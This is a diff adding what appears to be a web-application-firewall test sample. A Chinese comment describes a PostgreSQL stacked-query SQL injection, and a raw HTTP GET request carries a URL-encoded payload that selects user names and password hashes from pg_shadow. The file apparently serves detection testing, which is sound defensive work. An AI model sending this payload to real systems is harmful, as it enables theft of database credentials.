@@ -1,0 +1,9 @@
+# SQL注入_GET_postgresql _普通注入-06506352
+# 攻击者基于堆叠查询，将"select usename, passwd from pg_shadow"语句注入到 SQL 查询参数中，从而查询系统表pg_shadow中的用户名和密码，为进一步的攻击提供帮助。
+GET /?id=1%3Bselect%20usename%2C%20passwd%20from%20pg_shadow&bid=hd_tag_m8mv23ym HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23ym
+RM-PRO-Token: ca70e3c7f11a215d0005da605a93f46f
+RM-PRO-Time: 1742808352913
+User-Agent: curl/7.83.1
+
